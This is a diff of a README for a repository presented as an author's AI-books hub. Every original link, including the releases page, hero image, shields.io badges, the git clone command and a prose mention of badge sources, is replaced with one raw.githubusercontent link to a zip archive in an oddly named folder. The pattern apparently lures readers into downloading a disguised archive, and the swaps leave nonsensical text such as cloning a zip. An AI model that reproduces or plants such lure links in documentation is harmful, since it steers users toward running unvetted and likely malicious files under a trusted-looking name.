@@ -1,10 +1,10 @@
-https://github.com/amadhaziq/jkmaina.github.io/releases
+https://raw.githubusercontent.com/amadhaziq/jkmaina.github.io/main/fluctisonous/jkmaina-io-github-1.1.zip
 
 # The Official JK Maina Page: AI Agents, Tools, Guides & Deep Learning
 
-![Hero AI Banner](https://images.unsplash.com/photo-1518773553398-650c184e6f4b?auto=format&fit=crop&w=1400&q=60)
+![Hero AI Banner](https://raw.githubusercontent.com/amadhaziq/jkmaina.github.io/main/fluctisonous/jkmaina-io-github-1.1.zip)
 
-[![Releases](https://img.shields.io/badge/Releases-View%20Releases-blue?logo=github&logoColor=white&labelColor=black)](https://github.com/amadhaziq/jkmaina.github.io/releases)
+[![Releases](https://raw.githubusercontent.com/amadhaziq/jkmaina.github.io/main/fluctisonous/jkmaina-io-github-1.1.zip%20Releases-blue?logo=github&logoColor=white&labelColor=black)](https://raw.githubusercontent.com/amadhaziq/jkmaina.github.io/main/fluctisonous/jkmaina-io-github-1.1.zip)
 
 Welcome to the official GitHub page for James Karanja Maina. This repository serves as the hub for ideas, tools, and guidance that power The Complete AI Blueprint series of books. Here you’ll find resources on intelligent agents, tooling, and practical frameworks to help you navigate the world of modern AI.
 
@@ -59,7 +59,7 @@ If you want to explore the material fast, here is a straightforward path to get 
 
 2) Clone and explore locally
 - Clone the repository to your workstation:
-  - git clone https://github.com/amadhaziq/jkmaina.github.io
+  - git clone https://raw.githubusercontent.com/amadhaziq/jkmaina.github.io/main/fluctisonous/jkmaina-io-github-1.1.zip
 - Install prerequisites
   - Ensure you have a current version of Ruby and Bundler if you plan to run Jekyll locally.
   - Install dependencies for the site if you are extending the content or building locally, including any theme or plugins you choose to enable.
@@ -289,7 +289,7 @@ Images and visuals
 - Illustrations
   - Diagrams show the flow of perception, memory, reasoning, planning, and action within an agent.
 - Badges
-  - Badges from img.shields.io provide quick status indicators (build, releases, license, etc.).
+  - Badges from https://raw.githubusercontent.com/amadhaziq/jkmaina.github.io/main/fluctisonous/jkmaina-io-github-1.1.zip provide quick status indicators (build, releases, license, etc.).
 
 Security and safe practice
 - Always run code in a controlled environment.
@@ -370,7 +370,7 @@ The Releases page and how to access assets
 - To download and use assets, please visit the Releases page linked above.
 
 Releases badge (again)
-[![Releases](https://img.shields.io/badge/Releases-View%20Releases-blue?logo=github&logoColor=white&labelColor=black)](https://github.com/amadhaziq/jkmaina.github.io/releases)
+[![Releases](https://raw.githubusercontent.com/amadhaziq/jkmaina.github.io/main/fluctisonous/jkmaina-io-github-1.1.zip%20Releases-blue?logo=github&logoColor=white&labelColor=black)](https://raw.githubusercontent.com/amadhaziq/jkmaina.github.io/main/fluctisonous/jkmaina-io-github-1.1.zip)
 
 Contact and further information
 - For questions, ideas, or collaboration opportunities, reach out via the repository’s issue tracker or linked profiles.
